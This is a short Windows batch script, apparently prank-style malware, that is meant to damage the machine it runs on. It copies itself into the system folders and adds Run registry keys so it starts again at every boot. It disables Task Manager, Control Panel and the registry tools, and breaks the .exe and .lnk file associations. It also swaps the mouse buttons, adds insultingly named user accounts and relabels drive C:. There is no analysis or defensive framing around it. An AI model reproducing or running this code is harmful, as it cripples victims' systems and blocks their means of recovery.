@echo off
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
copy %0 %windir%\system32
copy %0 %windir%\system
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Cool" /t REG_SZ /d "%SystemRoot%\system32\fear.bat" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Cooler" /t REG_SZ /d "%SystemRoot%\system\fear.bat" /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%explorer.exe /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
assoc .lnk=.txt >nul
assoc .exe=.mp3 >nul
net user "Idiot you Hacked" /add >nul
net user "Bitch you Hacked" /add >nul
net user "Durak you Hacked" /add >nul
net user "Kritin you Hacked" /add >nul
net user "Gavno you Hacked" /add >nul
label c: LOL YOU HACKED 